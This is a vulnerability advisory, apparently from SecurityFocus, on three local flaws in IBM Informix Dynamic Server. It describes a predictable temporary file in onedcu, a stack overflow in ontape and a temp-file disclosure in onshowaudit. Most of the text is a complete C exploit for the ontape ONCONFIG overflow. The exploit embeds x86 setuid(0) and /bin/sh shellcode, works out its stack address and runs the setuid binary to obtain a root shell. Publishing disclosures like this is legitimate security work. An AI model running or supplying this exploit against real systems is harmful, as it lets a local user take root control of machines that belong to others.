source: http://www.securityfocus.com/bid/9512/info
 
IBM Informix Dynamic Server and IBM Informix Extended Parallel Server have been reported prone to multiple vulnerabilities.
 
The first issue exists in the onedcu binary. Specifically, when the binary is invoked a predictable temporary file is created. A local attacker may exploit this issue to launch symbolic link style attacks ultimately resulting in elevated privileges.
 
The second issue that has been reported to exist in the ontape binary. The ontape binary has been reported to be prone to a local stack based buffer overflow vulnerability. Ultimately the attacker may exploit this condition to influence execution flow of the vulnerable binary into attacker-controlled memory. This may lead to the execution of arbitrary instructions with elevated privileges.
 
A third issue has been reported to affect the onshowaudit binary. Specifically, the onshowaudit binary reads data from temporary files contained in the "tmp? directory. These files have predictable filenames; an attacker may exploit this issue to disclose data that may be used in further attacks launched against the vulnerable system. 

/* Exploit informix 8or user with DSA privileges -> root in a Informix IDSv9.40. it seems to
exist a correct environment variable size checking for INFORMIXDIR (old security nightmare in
other versions) but forgot to check ONCONFIG env vble size.

We can found similar ONCONFIG overflows, but In other binaries in this installation exists a
setuid32(0x1f7) (the uid for informix user in my installation) before the bof occurs.
Unfortunately not in this binary


Vulnerability researched by        Juan Manuel Pascual Escriba
08/08/2003 Barcelona - Spain       pask@open3s.com
http://www.open3s.com

*/

#include <stdio.h>



char sc[]=
"\x29\xc0"                               
"\x29\xdb"                                         
"\x29\xc9"                                
"\x29\xd2"                               
"\xb0\xa4"                              
"\xcd\x80"                             
"\xeb\x1f"
"\x5e"
"\x89\x76\x08"
"\x31\xc0"
"\x88\x46\x07"
"\x89\x46\x0c"
"\xb0\x0b"
"\x89\xf3"
"\x8d\x4e\x08"
"\x8d\x56\x0c"
"\xcd\x80"
"\x31\xdb"
"\x89\xd8"
"\x40"
"\xcd\x80"
"\xe8\xdc\xff\xff\xff"
"/bin/sh";


#define STACK_TOP_X86 0xC0000000
#define ALG_MASK 0xfffffff4
#define ADDR 560
#define DFL_ALG 4
#define INFORMIXDIR "/home/informix-9.40/"
#define ONTAPE "/home/informix-9.40/bin/ontape"


int main(int arc, char **arv){
        char *argv[2];
        char *envp[3];
        unsigned long sc_address, ba=0;
        unsigned char alg = DFL_ALG;
        unsigned long *p;
        unsigned char *q;
        unsigned int i;




        /* calculate where in the stack will be our shellcode */

        sc_address = STACK_TOP_X86 - 4 - strlen(ONTAPE) - sizeof(sc) - 1;
        printf("shellcode address = 0x%X\n",sc_address);

        /* add back pad to align sc if necessary */

        if( (sc_address & ALG_MASK) != sc_address ) {
                ba = sc_address - (sc_address & ALG_MASK);
                printf("adding %d trailing bytes to backward align hellcode to 0x%X\n", ba,
sc_address & ALG_MASK);
                sc_address = STACK_TOP_X86 - 4 - strlen(ONTAPE) - sizeof(sc) - ba - 1;
                printf("new shellcode address = 0x%X\n",sc_address);
        }

        /* craft zhellcoded environment */
        envp[2] = (char*)malloc(sizeof(sc)+strlen("pete=")+1+ba);
        q = envp[2];
        strcpy(q,"pete=");
        q += strlen("pete=");
        memcpy(q,sc,sizeof(sc));
        q += sizeof(sc)-1;
        memset(q,'A',ba);
        q += ba;
        *q = 0;

        /* build overflowing arvg */

        alg = DFL_ALG;

        printf("using alignment = %d in overflow buffer\n",alg);
        if(arv[2]) alg = atoi(arv[2]);

        argv[0] = ONTAPE;
	argv[1] = 0;

	/* finalizamos argv[] aqui el overflow esta en una variable de entorno
	llamada ONCONFIG */

	envp[0] = (char*)malloc(ADDR*sizeof(unsigned long)+alg+1+strlen("ONCONFIG="));
	q = envp[0];
	strcpy(q,"ONCONFIG=");
	q += strlen ("ONCONFIG=");
	memset(q,'A',alg);
	q += alg -1;
        p=(unsigned long*)(envp[0]+alg+strlen("ONCONFIG="));
        for(i=0;i<ADDR;i++) {
                *p = sc_address;
                p++;
        };
        *p = 0;
        envp[1] = "INFORMIXDIR=/home/informix-9.40"; 
	envp[3] = 0;
        
	printf("executing %s ...\n\n",argv[0]);
        execve(argv[0],argv,envp); 



}


